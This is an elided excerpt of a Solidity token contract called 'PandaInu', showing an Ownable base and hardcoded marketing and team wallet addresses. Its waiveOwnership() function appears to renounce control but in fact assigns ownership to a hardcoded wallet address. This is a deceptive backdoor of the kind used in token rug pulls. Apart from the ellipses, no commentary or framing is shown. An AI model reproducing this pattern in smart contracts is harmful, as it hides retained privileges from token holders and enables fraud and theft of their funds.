...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x920EfCA7DAE73469d12902d15ED3CCcfD1000428);
    }
...
contract PandaInu is Context, IERC20, Ownable {
    ...
    string private _name = "PandaInu";
    string private _symbol = "PandaInu";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x97567892b4F5a3bA5aB9a23ff82676fCB7E9D773);
    address payable public teamWalletAddress = payable(0x97567892b4F5a3bA5aB9a23ff82676fCB7E9D773);
